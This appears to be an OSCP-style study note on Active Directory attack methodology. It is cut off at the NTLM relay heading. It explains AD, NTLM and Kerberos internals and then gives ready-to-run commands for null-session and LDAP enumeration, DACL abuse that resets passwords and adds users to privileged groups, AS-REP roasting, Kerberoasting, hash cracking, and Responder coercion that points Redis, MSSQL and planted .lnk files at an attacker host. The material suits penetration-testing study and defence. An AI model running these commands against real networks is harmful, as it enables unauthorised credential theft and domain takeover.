# Active Directory Methodology

> *Operational Workflow: Target Identification & Role Detection (Phase 1) -> Unauthenticated & Authenticated Enumeration (Phase 2) -> Initial Domain Compromise (Phase 3) -> Lateral Movement (Phase 4) -> Object ACL & DACL Abuse (Phase 5) -> Kerberos Overpass-the-Hash (Phase 6) -> Domain Dominance & Persistence (Phase 7-10) -> Decision Tree & Operational Checklist (Phase 11-12)*
> *Essential Cheatsheets: [[⚔️ ad-attacks|AD Attacks]], [[🔧 impacket|Impacket]], [[⛏️ hashcat-john|Hashcat & John]], [[🔀 ligolo-chisel|Ligolo & Chisel]], [[🪟 windows-commands|Windows Commands]], [[🐢 reverse-shells|Reverse Shells]]*

---

# Phase 0: Active Directory Fundamentals and Core Architecture

> *A deep conceptual understanding of Active Directory protocols and structures is required to identify vulnerabilities, predict authentication behavior, and execute reliable domain exploitation.*

## Phase 0.1: Core AD Architecture (Forest, Domain, DC, OU, and GPO)

Active Directory Domain Services (AD DS) is organized hierarchically. A **Forest** represents the absolute security boundary, containing one or more **Domains**. Each Domain contains at least one **Domain Controller (DC)** that manages centralized authentication and stores the directory database (`NTDS.dit`).
Within each domain, objects (Users, Groups, Computers) are organized into logical containers called **Organizational Units (OUs)**. **Group Policy Objects (GPOs)** are linked to OUs, domains, or sites to enforce configurations and security settings across domain-joined machines.

### Key Architectural Components

| Component | Role in Active Directory Architecture |
| :--- | :--- |
| **Domain Controller (DC)** | The central server managing authentication, authorization, and directory replication. |
| **NTDS.dit** | The primary database file containing all Active Directory objects, attributes, and user password hashes. |
| **LSASS** | The Local Security Authority Subsystem Service running in memory on Windows systems to cache credentials for Single Sign-On (SSO). |
| **KDC (Key Distribution Center)** | The Kerberos service running on the Domain Controller responsible for issuing tickets (`AS-REP` and `TGS-REP`). |
| **krbtgt Account** | The default service account used by the KDC. Its password hash encrypts and signs all Kerberos Ticket Granting Tickets (TGTs). |

### LDAP and Distinguished Names (DN)

The Lightweight Directory Access Protocol (LDAP) provides the query and directory manipulation interface for Active Directory. Every object in the directory is uniquely identified by its **Distinguished Name (DN)**, specifying its exact path within the hierarchy:

```text
LDAP://CN=Administrator,CN=Users,DC=corp,DC=local
        |                 |        |
        +-- Common Name   |        +-- Domain Components (corp.local)
            (Object Name) +-- Container (Users)
```

- **CN (Common Name)**: Identifies individual objects such as user accounts, security groups, or computer assets.
- **OU (Organizational Unit)**: Identifies administrative containers applied for organizational structuring and Group Policy targeting.
- **DC (Domain Component)**: Identifies individual segments of the domain namespace (e.g., `corp.local` maps to `DC=corp,DC=local`).

### Service Principal Names (SPN)

A **Service Principal Name (SPN)** uniquely maps a running service instance on a host to an Active Directory service account under which it executes:

```text
Service Principal Name Format: ServiceClass/Hostname:Port
Example: MSSQLSvc/DB01.corp.local:1433
```

- The Domain Controller consults the registered SPN to determine which service account hash must encrypt the Kerberos Ticket Granting Service (`TGS`) ticket.
- Any authenticated domain user can query the directory and request a valid Kerberos `TGS` ticket for any registered SPN.
- This architectural design forms the foundation of the **Kerberoasting** attack vector.

---

## Phase 0.2: NTLM Authentication Architecture

> *NTLM (NT LAN Manager) is a legacy challenge-response authentication protocol. Windows defaults to NTLM when accessing resources via raw IP addresses or when Kerberos is unavailable.*

NTLM operates via a three-way Challenge-Response handshake, ensuring cleartext passwords never traverse the network:

```text
1. Client -> Server  : Negotiate message ("Authentication request for USER")
2. Server -> Client  : Challenge message (Server generates a random 8-byte nonce challenge)
3. Client -> Server  : Authenticate message (Encrypts challenge with user's NTLM hash -> NetNTLMv2 response)
4. Server -> DC      : Validates username, challenge, and NetNTLM response against NTDS.dit via Netlogon
5. DC -> Server      : Returns authentication verdict (Access Granted or Access Denied)
6. Server -> Client  : Establishes session or rejects connection
```

### Security Implications and Vulnerabilities:
- **Fast Hashing Algorithm**: The underlying stored NTLM hash is an unsalted MD4 digest of the Unicode password. It is computationally weak and cracks at speeds exceeding 600+ billion guesses per second on modern GPU clusters.
- **Pass-the-Hash Viability**: Because the stored NTLM hash acts directly as the cryptographic key to compute the challenge response, possession of the hash is completely sufficient to authenticate without cracking the original cleartext password.
- **NetNTLM Capture and Relay**: The network exchange (`NetNTLMv1`/`NetNTLMv2`) can be intercepted using rogue authentication listeners (Responder). Captured responses can be cracked offline or relayed in real-time to other network servers where SMB Signing is disabled.

---

## Phase 0.3: Kerberos Authentication Architecture

> *Kerberos is the default authentication protocol in Active Directory. It relies on cryptographically signed tickets rather than passwords, offloading service validation to application servers and minimizing DC overhead.*

### The 3-Step Kerberos Authentication Handshake

```text
STEP 1: AS Exchange (Initial Authentication -> Requesting a TGT)
-----------------------------------------------------------------
Client -> DC (AS-REQ) : Timestamp encrypted with user's NTLM/AES key (Pre-Authentication)
DC -> Client (AS-REP) : TGT encrypted with the krbtgt account hash
                        + Session Key encrypted with user's key

STEP 2: TGS Exchange (Service Ticket Request -> Requesting Access)
-----------------------------------------------------------------
Client -> DC (TGS-REQ) : Presents the valid TGT + Target Service Principal Name (SPN)
DC -> Client (TGS-REP) : Ticket Granting Service (TGS) ticket encrypted with
                         the target SERVICE ACCOUNT hash

STEP 3: AP Exchange (Application Access -> Service Connection)
-----------------------------------------------------------------
Client -> Service (AP-REQ) : Presents the TGS ticket directly to the application service
Service                    : Decrypts the TGS ticket using its own password hash -> Access Granted
                             (The Domain Controller is not contacted during this final step)
```

### Kerberos Attack Vectors and Architectural Weaknesses

| Attack Vector | Exploited Protocol Mechanism |
| :--- | :--- |
| **AS-REP Roasting** | Step 1: If Kerberos Pre-Authentication is disabled (`DONT_REQUIRE_PREAUTH`), the DC returns an `AS-REP` packet without requiring proof of identity. The encrypted session key is cracked offline. |
| **Kerberoasting** | Step 2: Any authenticated user can request a `TGS` ticket for any registered SPN. The returned ticket is encrypted with the service account password hash and cracked offline. |
| **Golden Ticket** | Compromise of the `krbtgt` hash allows an attacker to forge arbitrary `TGT` tickets with domain administrator privileges and custom lifespans. |
| **Silver Ticket** | Compromise of an individual service account hash allows forging arbitrary `TGS` tickets directly for that service without interacting with the DC. |
| **Overpass-the-Hash** | An attacker holding an NTLM hash requests a full Kerberos `TGT` from the DC to pivot into Kerberos-only services. |
| **Pass-the-Ticket** | Kerberos tickets stored in memory (`LSASS`) are extracted and injected into the current logon session. |

### TGT vs TGS Comparative Analysis

| Attribute | Ticket Granting Ticket (TGT) | Ticket Granting Service (TGS) |
| :--- | :--- | :--- |
| **Operational Role** | General identity pass (Domain Passport) | Targeted access permit for a specific service |
| **Encryption Key** | `krbtgt` account password hash | Target service account password hash |
| **Default Lifetime** | Typically 10 hours (renewable up to 7 days) | Matches session duration (typically 10 hours) |
| **Acquisition Method** | Obtained during initial logon (`AS-REQ`/`AS-REP`) | Requested from KDC using existing TGT (`TGS-REQ`/`TGS-REP`) |

---

## Phase 0.4: Tokens, SIDs, ACLs, and DACLs

Active Directory controls object access using **Security Identifiers (SIDs)** and **Access Control Lists (ACLs)**. Every security principal (User, Group, Computer) receives an immutable SID upon creation.

### LSASS and Cached Memory Credentials

The Local Security Authority Subsystem Service (`lsass.exe`) maintains security tokens and caches operational credentials in RAM to facilitate Single Sign-On (SSO):

```text
LSASS Process Memory Cache:
├── Stored NTLM hashes of authenticated users
├── Cleartext credentials (if WDigest or legacy authentication providers are enabled)
├── Active Kerberos tickets (TGT and TGS tickets)
└── Kerberos session encryption keys
```

- **Administrative Requirement**: Accessing LSASS memory requires Local Administrator privileges and the `SeDebugPrivilege` user right.
- **Exploitation Tool**: Mimikatz (`privilege::debug` -> `sekurlsa::logonpasswords`).
- **Operational Impact**: If a privileged domain administrator logs into a compromised workstation, their credentials or Kerberos tickets remain in LSASS memory, allowing instant lateral escalation via Pass-the-Hash or Pass-the-Ticket.

### Access Control List (ACL) Architecture

Every Active Directory object possesses an Access Control List:

```text
Object Access Control List (ACL)
├── DACL (Discretionary Access Control List) - Governs effective permissions
│   ├── Access Control Entry (ACE) 1: helpdesk_user -> GenericAll on target_user
│   ├── Access Control Entry (ACE) 2: Domain Admins -> Full Control
│   └── ACE 3: Enterprise Admins -> Full Control
└── SACL (System Access Control List) - Manages auditing and logging (non-offensive)
```

### High-Value Exploitable Permissions (BloodHound Edges)

| Permission / Edge | Operational Capability and Exploitation Path |
| :--- | :--- |
| **`GenericAll`** | Full control over the target object: reset passwords, add group members, modify attributes, or disable accounts. |
| **`GenericWrite`** | Modify non-protected attributes, such as injecting an arbitrary SPN to enable Targeted Kerberoasting. |
| **`WriteDacl`** | Modify the object's DACL to grant the attacker `GenericAll` / Full Control permissions. |
| **`WriteOwner`** | Take ownership of the object, which inherently grants `WriteDacl` rights to assign `GenericAll`. |
| **`ForceChangePassword`** | Reset the user account password directly via LDAP/RPC without requiring knowledge of the current password. |

---

## Phase 0.5: Domain Trusts and Critical Rules of Engagement

> *Trust relationships link Active Directory domains. Intra-forest trusts are transitive by default (Domain A trusts Domain B, and Domain B trusts Domain C, therefore Domain A trusts Domain C). Inter-forest trusts link independent security boundaries.*

### Fundamental Rules for Active Directory Exploitation

> ⚠️ **Rule 1: Hostname vs Raw IP Address Resolution**
> Kerberos authentication strictly requires target **hostnames** (`\\DC01.corp.local` or `\\DC01`). Supplying a raw IP address (`\\192.168.x.x`) forces Windows to fall back to NTLM, causing Golden and Silver Tickets to fail with `Access Denied`. Always populate `/etc/hosts` with domain mappings.

> ⚠️ **Rule 2: Remote UAC Restrictions on Pass-the-Hash**
> - Pass-the-Hash **succeeds** against: Domain user accounts holding local Administrator rights, and the built-in local `Administrator` account (RID 500).
> - Pass-the-Hash **fails** against: Custom local user accounts even if they belong to the Administrators group. Windows Remote UAC strips remote tokens down to medium integrity unless the account is the built-in RID 500 account or registry key `LocalAccountTokenFilterPolicy` is set to `1`.

> ⚠️ **Rule 3: PAC Validation Post-2022 Security Patches**
> Modern Domain Controllers enforce strict PAC validation. When forging Golden or Silver Tickets, the `/user:` parameter MUST specify a **real, active domain user account**. Fictitious usernames will fail KDC PAC signature checks.

> ⚠️ **Rule 4: Token Identity vs Network Context Post-Overpass-the-Hash**
> Executing `whoami` immediately after an Overpass-the-Hash injection will still show the local user identity. However, all outbound network authentication queries will transparently utilize the injected Kerberos ticket in memory.

---

## Phase 0.6: Typical OSCP Active Directory Lab Architecture

```text
[Kali Linux Attacker] ─── VPN ───> [Internal Client 1]  <─── Domain ───>  [Domain Controller (DC)]
                                   [Internal Client 2]  <─── Domain ───>          |
                                                                                  v
                                                                        (NTDS.dit Database:
                                                                         All Domain Hashes)
```

- **Client Workstations (1-2 Hosts)**: Host business applications, web portals, SQL databases, and file shares. They do not run Kerberos (port 88) or LDAP (port 389) servers. Initial footholds are established here via web vulnerabilities, service misconfigurations, or provided assumed-breach credentials.
- **Domain Controller (DC)**: The core infrastructure server hosting the KDC, LDAP, and the centralized `NTDS.dit` database. This host is the ultimate target.
- **Attack Trajectory**: Attackers compromise an internal client host first, elevate privileges locally, extract cached credentials, identify active sessions or misconfigurations, move laterally through the domain, and execute domain takeover against the Domain Controller.

---

---

# Active Directory Attack Vector Triage Matrix

> *Operational Triage: Select the appropriate attack methodology based on currently discovered assets, credentials, or domain permissions.*

| Discovered Prerequisite / Access Level | Target Attack Vector | Direct Methodology Section |
| :--- | :--- | :--- |
| Candidate usernames list / No credentials | AS-REP Roasting | [[#3.1: AS-REP Roasting (Unauthenticated and Authenticated)]] |
| Valid domain user credentials (User:Pass) | Kerberoasting | [[#3.2: Kerberoasting (Authenticated)]] |
| Broadcast traffic / UNC path injection vector | LLMNR Poisoning & NetNTLM Capture | [[#3.3: Responder (Capturing NetNTLMv2 Hashes)]] |
| Unsigned SMB hosts or LDAP access | NTLM Challenge Forwarding | [[#3.4: NTLM Relay Attacks (ntlmrelayx)]] |
| Valid password candidate / Multiple accounts | Domain Password Spraying | [[#4.1: Domain Password Spraying]] |
| Raw NTLM password hash (`AAD3...:HASH`) | Pass-The-Hash Execution | [[#4.2: Pass-The-Hash (PtH)]] |
| High-privilege session active in LSASS | Kerberos Ticket Extraction | [[#4.3: Pass-The-Ticket (PtT)]] |
| Local Administrator shell on workstation | Host Credential Dumping | [[#4.4: Credential Dumping on Compromised Workstations]] |
| BloodHound edges: `GenericAll`, `WriteDacl` | Object Permission Escalation | [[#Phase 5: DACL and Object Access Control (ACL) Abuse]] |
| NTLM hash with Kerberos-only services | Kerberos TGT Generation | [[#Phase 6: Overpass-the-Hash and Pass-the-Key]] |
| `Replicating Directory Changes` rights | Domain Password Dumping | [[#7.1: DCSync Attack (Directory Replication Service Remote - MS-DRSR)]] |
| Compromised `krbtgt` account hash | Domain-Wide Persistence | [[#7.2: Golden Ticket (Domain-Wide Ticket Granting Ticket Forgery)]] |
| Compromised service account password hash | Stealthy Service Access | [[#7.3: Silver Ticket (Targeted Service Ticket Forgery)]] |
| AD CS PKI with `ENROLLEE_SUPPLIES_SUBJECT` | Certificate Impersonation | [[#8.1: ESC1 - Misconfigured Certificate Template Exploitation]] |
| AD CS HTTP enrollment + PetitPotam | Coerced Relay to CA | [[#8.2: Coerced Authentication and NTLM Relay to AD CS (ESC8)]] |
| Host with `TRUSTED_FOR_DELEGATION` flag | LSASS TGT Interception | [[#9.1: Unconstrained Delegation]] |
| Account with `msDS-AllowedToDelegateTo` | Kerberos S4U Impersonation | [[#9.2: Constrained Delegation (S4U2Self and S4U2Proxy)]] |
| Write access on computer object / Quota > 0 | Computer Object Delegation | [[#9.3: Resource-Based Constrained Delegation (RBCD)]] |
| Subnet broadcast with Windows DHCPv6 query | Rogue IPv6 DNS Poisoning | [[#Phase 10: IPv6 DNS Takeover and Relay (mitm6)]] |

# Phase 1: Reconnaissance and Target Identification

## 1.1: Identifying Network Roles and Machine Signatures

### Domain Controller Identification Signature
A Domain Controller host is uniquely distinguished by the concurrent presence of **DNS (53) + Kerberos (88) + LDAP (389)**:

```text
Port 53   -> DNS
Port 88   -> Kerberos KDC
Port 389  -> LDAP
Port 445  -> SMB
Port 636  -> LDAPS (LDAP over SSL)
Port 3268 -> Global Catalog
Port 5985 -> WinRM (Windows Remote Management)
```

### Client Workstation Identification Signature
Client machines run application services and standard administrative interfaces. **Ports 88 and 389 are absent on client workstations**:

```text
Port 80 / 443 -> HTTP / HTTPS web applications
Port 445      -> SMB file sharing
Port 1433     -> Microsoft SQL Server (MSSQL)
Port 3306     -> MySQL
Port 3389     -> Remote Desktop Protocol (RDP)
Port 5985     -> WinRM
Port 6379     -> Redis
Port 8080     -> Alternative application servers (Jenkins, Tomcat)
```

### Domain Name Discovery and Host Configuration
Active Directory domain names appear in Nmap script scan outputs, SMB banner discovery, and LDAP naming contexts:

```bash
# 1. Update /etc/hosts with Domain FQDN and NetBIOS mappings
echo "[DC_IP] corp.local dc01.corp.local DC01" | sudo tee -a /etc/hosts
echo "[CLIENT_IP] client01.corp.local CLIENT01" | sudo tee -a /etc/hosts

# 2. Extract domain name via SMB negotiation
nxc smb [DC_IP]
```

> ⚠️ **FQDN vs NetBIOS Name Resolution:**
> Tools like `enum4linux-ng` often return only the short NetBIOS name (`CORP`). Ensure the fully qualified domain name (FQDN, e.g., `corp.local`) is mapped in `/etc/hosts` to enable Kerberos ticket negotiation.

---

# Phase 2: Active Directory Enumeration

> *Thorough enumeration constitutes the foundation of Active Directory security testing. Every attack path originates from comprehensive identification of users, groups, permissions, and network shares.*

## 2.1: Enumeration Without Credentials (Anonymous and Null Sessions)

### SMB Null Session Inspection (Port 445)
```bash
# Test anonymous null session access on the target host
smbclient -L //[TARGET_IP]/ -N
nxc smb [TARGET_IP] -u '' -p '' --shares
nxc smb [TARGET_IP] -u 'guest' -p '' --shares

# Deep automated SMB information harvesting
enum4linux-ng -A [TARGET_IP]
```

### LDAP Anonymous Directory Querying (Port 389)
```bash
# Query the root domain naming context
ldapsearch -x -H ldap://[DC_IP] -s base namingcontexts

# Extract all domain user account names via anonymous bind
ldapsearch -x -H ldap://[DC_IP] -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

### Kerberos Username Enumeration (Port 88)
```bash
# Validate domain usernames against Kerberos KDC without authentication
kerbrute userenum -d corp.local --dc [DC_IP] /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt
```
> 💡 *Prioritize service accounts matching `svc-*`, `sql*`, `backup*`, and `admin*`.*

### RPC Null Session Enumeration (Ports 135 and 139)
```bash
# Connect using an anonymous RPC null session
rpcclient -U "" -N [DC_IP]
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydispinfo
```

---

## 2.2: Enumeration of Services on Client Workstations

Client machines expose web services, databases, and administrative consoles. Cross-reference `[[01-Enumeration]]` and `[[02-Web-Attack]]` to achieve initial execution:
- Inspect HTTP applications for administrative panels, SQL injection, and local file inclusion.
- Audit MSSQL instances on port 1433 for default credentials (`sa` / blank).
- Review writable SMB shares for script files or unattended configuration secrets.

---

## 2.3: Enumeration With Credentials (Post-Foothold)

> *Immediately upon acquiring a valid username and password or NTLM hash, execute comprehensive domain mapping.*

### NetExec (nxc) Domain Enumeration
```bash
# 1. Validate credentials across all network hosts
nxc smb targets.txt -u [USERNAME] -p '[PASSWORD]' -d corp.local --continue-on-success

# 2. Enumerate accessible SMB shares
nxc smb [DC_IP] -u [USERNAME] -p '[PASSWORD]' --shares

# 3. Harvest user descriptions (frequently contain cleartext passwords!)
nxc ldap [DC_IP] -u [USERNAME] -p '[PASSWORD]' -M get-desc-users

# 4. Enumerate domain users and groups with RID cycling
nxc smb [DC_IP] -u [USERNAME] -p '[PASSWORD]' --users --rid-brute
```

### Authenticated SMB Share Hunting
```bash
smbclient -L //[TARGET_IP]/ -U 'corp.local\[USERNAME]%[PASSWORD]'
smbclient //[TARGET_IP]/[SHARE_NAME] -U 'corp.local\[USERNAME]%[PASSWORD]'
```

> 💡 **Priority Shares for Sensitive Data Analysis:**
> - `SYSVOL`: Contains Group Policy Preferences and startup scripts.
> - `NETLOGON`: Contains logon batch scripts (`.bat`, `.ps1`, `.vbs`) with hardcoded credentials.
> - Custom departmental shares (`IT`, `Backup`, `Data`, `Shared`): Contain configuration databases, `.kdbx` files, and documentation.

### Group Policy Preferences (GPP) Passwords in SYSVOL
```bash
# Automated GPP password extraction via NetExec
nxc smb [DC_IP] -u [USERNAME] -p '[PASSWORD]' -M gpp_password

# Manual extraction from SYSVOL share
smbclient //[DC_IP]/SYSVOL -U '[USERNAME]%[PASSWORD]'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Locate and decrypt stored cpassword strings
grep -ri "cpassword" .
gpp-decrypt "[ENCRYPTED_CPASSWORD_STRING]"
```

### BloodHound and SharpHound Domain Mapping
```bash
# 1. Collect domain relationship data remotely from Kali Linux
bloodhound-python -u [USERNAME] -p '[PASSWORD]' -d corp.local -ns [DC_IP] -c all

# 2. Or collect locally from an internal Windows foothold
.\SharpHound.exe -c all --zipfilename domain_data.zip
```
- Import the resulting `.zip` archive into the BloodHound GUI.

### BloodHound Graph Analysis and High-Value Edge Exploitation

> BloodHound represents Active Directory as a directed graph where nodes represent objects (Users, Groups, Computers, GPOs) and edges represent operational permissions. An attack path consists of a connected series of exploitable edges from a compromised node to Domain Admin.

#### Essential Pre-Built BloodHound Queries:
- `Find Shortest Paths to Domain Admins`: Highlights all attack chains terminating at Domain Administrator access.
- `Find Principals with DCSync Rights`: Identifies accounts holding directory replication privileges (`DS-Replication-Get-Changes`).
- `Find Kerberoastable Users`: Identifies all user accounts holding registered SPNs.
- `Find AS-REP Roastable Users`: Identifies accounts with `DONT_REQUIRE_PREAUTH` enabled.
- `Shortest Paths from Owned Principals`: Identifies actionable lateral movement paths originating from currently compromised accounts.

#### High-Value BloodHound Edge Exploitation Workflows:

**1. `GenericAll` - Full Control Over Target Object**
> Grants full permissions to read, write, reset passwords, modify group memberships, and adjust object attributes.

```powershell
# Reset target user password
net user [TARGET_USER] 'P@ssw0rd123!' /domain
Set-DomainUserPassword -Identity [TARGET_USER] -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)

# Add member to privileged group
Add-DomainGroupMember -Identity "Domain Admins" -Members "[MY_USER]"

# Configure RBCD on computer object
Set-ADComputer [TARGET_COMPUTER]$ -PrincipalsAllowedToDelegateToAccount [ATTACKER_COMPUTER]$
```

**2. `WriteDacl` - Modify Object Access Control Entries**
> Allows writing new ACE entries to the target object's DACL, enabling the attacker to grant themselves `GenericAll`.

```powershell
# Grant current user GenericAll permissions via WriteDacl
Add-DomainObjectAcl -TargetIdentity [TARGET_USER] -PrincipalIdentity [MY_USER] -Rights All -Verbose

# Execute privileged operation post-assignment
Set-DomainUserPassword -Identity [TARGET_USER] -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
```
```bash
# Modify DACL remotely from Linux using Impacket
impacket-dacledit -action write -rights FullControl -principal [MY_USER] -target [TARGET_USER] corp.local/[MY_USER]:'[PASSWORD]'
```

**3. `ForceChangePassword` - Administrative Password Reset**
> Allows resetting an account's password without supplying or knowing the existing password.

```powershell
Set-DomainUserPassword -Identity [TARGET_USER] -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Verbose
net user [TARGET_USER] 'P@ssw0rd123!' /domain
```
```bash
# Execute administrative reset remotely via RPC
rpcclient -U 'corp.local/[MY_USER]%[PASSWORD]' [DC_IP] -c "setuserinfo2 [TARGET_USER] 23 'P@ssw0rd123!'"
```

**4. `GenericWrite` - Attribute Modification and Targeted Kerberoasting**
> Allows modifying writable object attributes, including `servicePrincipalName`.

```powershell
# Inject arbitrary SPN to make account Kerberoastable
Set-DomainObject -Identity [TARGET_USER] -Set @{serviceprincipalname='fake/spn'} -Verbose

# Request Kerberos ticket from Kali
# impacket-GetUserSPNs corp.local/[MY_USER]:'[PASSWORD]' -dc-ip [DC_IP] -request

# Clean up injected SPN after ticket capture
Set-DomainObject -Identity [TARGET_USER] -Clear serviceprincipalname -Verbose
```

**5. `WriteOwner` / `Owns` - Ownership Hijacking**
> Taking ownership grants implicit `WriteDacl` permissions, establishing the chain: `WriteOwner` -> `WriteDacl` -> `GenericAll`.

```powershell
# Assign ownership of target object
Set-DomainObjectOwner -Identity [TARGET_OBJECT] -OwnerIdentity [MY_USER] -Verbose

# Grant GenericAll rights to self
Add-DomainObjectAcl -TargetIdentity [TARGET_OBJECT] -PrincipalIdentity [MY_USER] -Rights All -Verbose
```
```bash
# Execute ownership takeover remotely from Linux
impacket-owneredit -action write -new-owner [MY_USER] -target [TARGET_OBJECT] corp.local/[MY_USER]:'[PASSWORD]'
impacket-dacledit -action write -rights FullControl -principal [MY_USER] -target [TARGET_OBJECT] corp.local/[MY_USER]:'[PASSWORD]'
```

**6. `AddMember` - Direct Group Membership Injection**
```powershell
Add-DomainGroupMember -Identity "IT Admins" -Members "[MY_USER]" -Verbose
net group "IT Admins" [MY_USER] /add /domain
```
```bash
bloodyAD -d corp.local -u [MY_USER] -p '[PASSWORD]' --host [DC_IP] add groupMember "IT Admins" [MY_USER]
```

### High-Yield BloodHound Attack Chains

| Attack Chain Sequence | Operational Execution Strategy |
| :--- | :--- |
| `WriteOwner` -> `WriteDacl` -> `GenericAll` -> DCSync | Take ownership of target account, assign full control, execute DCSync. |
| `GenericWrite` -> Targeted Kerberoast -> Crack Hash | Inject arbitrary SPN into user account, request TGS ticket, crack offline. |
| `AddMember` -> Privileged Group -> DA Access | Add compromised account to intermediate group holding administrative rights. |
| `GenericAll` on Computer -> RBCD -> Administrator Impersonation | Configure delegation rights on computer object, execute S4U attack chain. |
| `ForceChangePassword` -> Credential Harvesting -> Lateral Movement | Reset targeted user password, establish WinRM or SMB sessions. |

---

# Phase 3: Initial Domain Compromise and Kerberos Exploitation

## 3.1: AS-REP Roasting (Unauthenticated and Authenticated)

> *Target Profile: User accounts configured with Kerberos Pre-Authentication disabled (`DONT_REQUIRE_PREAUTH`).*

### Protocol Mechanism:
In a standard Kerberos AS Exchange (Step 1), a client authenticates by sending a timestamp encrypted with their password hash (`AS-REQ`). This mechanism proves password possession before the KDC generates a ticket.
When the `DONT_REQUIRE_PREAUTH` flag is enabled, the KDC skips this validation and issues an `AS-REP` packet directly to any requester without requiring authentication.

The returned `AS-REP` message contains:
1. The **Ticket Granting Ticket (TGT)** (encrypted with the `krbtgt` account hash).
2. The **Kerberos Session Key** (encrypted with the **targeted user's NTLM password hash**).

Attackers capture this encrypted session key and crack it offline using high-performance dictionary attacks.

> 💡 *Why this configuration exists: Legacy Unix systems, automated service daemons, or older application frameworks frequently lack Kerberos pre-authentication capabilities. System administrators disable pre-authentication to maintain compatibility, creating high-risk exposure.*

```bash
# 1. Unauthenticated AS-REP Roasting (using a list of candidate usernames)
impacket-GetNPUsers corp.local/ -dc-ip [DC_IP] -usersfile users.txt -request -format hashcat -outputfile asrep_hashes.txt

# 2. Authenticated AS-REP Roasting (automatically queries LDAP for all vulnerable accounts)
impacket-GetNPUsers corp.local/[USERNAME]:'[PASSWORD]' -dc-ip [DC_IP] -request -format hashcat -outputfile asrep_hashes.txt

# 3. Local execution on Windows using Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

### Cracking AS-REP Hashes:
```bash
# Hashcat mode 18200 ($krb5asrep$23$)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> 💡 **Identification of Vulnerable Accounts via LDAP and PowerView:**
> ```powershell
> # PowerView query
> Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
> ```
> ```bash
> # LDAP search filter
> ldapsearch -x -H ldap://[DC_IP] -b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
> ```

---

## 3.2: Kerberoasting (Authenticated)

> *Target Profile: Active Directory service accounts mapped to registered Service Principal Names (SPNs).*

### Protocol Mechanism:
During the Kerberos TGS Exchange (Step 2), any authenticated domain user can request a Ticket Granting Service (`TGS`) ticket for any registered SPN. Kerberos offloads authorization to the target service; the KDC does not verify if the requesting user possesses administrative permissions on the destination host.

The returned `TGS` ticket is **encrypted with the NTLM password hash of the service account** linked to that SPN. The attacker extracts this encrypted ticket blob and cracks it offline.

> ⚠️ **Why Computer Accounts Cannot Be Kerberoasted:**
> Domain machine accounts (`COMPUTER$`) possess SPNs by default, but their passwords consist of 120+ randomly generated characters updated automatically by Windows every 30 days. They are mathematically impossible to crack offline. Kerberoasting exclusively targets **human-managed user accounts** holding registered SPNs (e.g., `svc-sql`, `svc-iis`, `svc-backup`).

```bash
# 1. Remotely request Kerberoastable service tickets using Impacket
impacket-GetUserSPNs corp.local/[USERNAME]:'[PASSWORD]' -dc-ip [DC_IP] -request -outputfile tgs_hashes.txt

# 2. Request tickets locally from Windows using Rubeus
.\Rubeus.exe kerberoast /outfile:tgs_hashes.txt

# 3. Target a specific high-value service account
.\Rubeus.exe kerberoast /user:svc-sql /outfile:tgs_sql.txt
```

### Cracking Kerberos TGS Hashes:
```bash
# Hashcat mode 13100 (RC4-HMAC: $krb5tgs$23$)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Hashcat mode 19700 (AES256-CTS-HMAC-SHA1-96: $krb5tgs$18$)
hashcat -m 19700 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

> 💡 **High-Priority Kerberoasting Targets:**
> - Accounts where `AdminCount=1` (indicates current or historical membership in privileged groups).
> - Service accounts associated with enterprise database engines (MSSQL, Oracle) or system orchestration (SCCM, Exchange).

---

## 3.3: Responder (Capturing NetNTLMv2 Hashes)

> *Operational Objective: Poison local broadcast name resolution queries (LLMNR, NBT-NS, mDNS) and capture incoming NetNTLMv2 authentication handshakes.*

When a Windows machine attempts to connect to a network share or host that cannot be resolved via DNS, it falls back to broadcast protocols. Responder answers these queries, posing as the requested service, and challenges the client to authenticate.

### Step 1: Start Responder Listener
```bash
sudo responder -I tun0 -dwv
```

### Step 2: Coerce Authentication via UNC Path Injection (`\\[KALI_IP]\share`)
Coerce the target service into authenticating against the attacker listener using Universal Naming Convention (UNC) paths:

```bash
# Vector A: Redis Daemon
redis-cli -h [TARGET_IP]
> CONFIG SET dir \\[KALI_IP]\fake
> eval "dofile('//[KALI_IP]/fakeshare')" 0

# Vector B: Microsoft SQL Server (MSSQL)
# Execute xp_dirtree or xp_fileexist via sqsh or impacket-mssqlclient
EXEC master..xp_dirtree '\\[KALI_IP]\share', 1, 1;
EXEC master..xp_fileexist '\\[KALI_IP]\share\test.txt';

# Vector C: Web Applications (SSRF, LFI, and Document Parsers)
# Pass UNC paths to URL inputs or file upload parameters:
\\[KALI_IP]\test.png
```

```bash
# Vector D: Writable SMB Shares via ntlm_theft
# Generate weaponized shortcut and configuration files
python3 ntlm_theft.py -g all -s [KALI_IP] -f payloads

# Deploy .lnk payload (triggers authentication immediately upon user interaction)
smbclient //[TARGET_IP]/SharedFolder -U 'corp.local\[USERNAME]%[PASSWORD]' -c "put payloads/payloads.lnk"
```
> 💡 *.lnk files trigger authentication when clicked or viewed in Explorer; .scf and .url files trigger automatically when the containing directory is browsed.*

### Step 3: Crack Captured NetNTLMv2 Hashes
```bash
# Hashcat mode 5600 (NetNTLMv2 / NTLMv2-SSP)
hashcat -m 5600 captured_netntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> ⚠️ **NetNTLMv2 vs Stored NTLM Hashes:**
> NetNTLMv2 responses captured over the wire **CANNOT** be used for Pass-the-Hash. They must either be cracked offline to recover the cleartext password or relayed in real-time to another network service via `ntlmrelayx`.

---

## 3.4: NTLM Relay Attacks (ntlmrelayx)

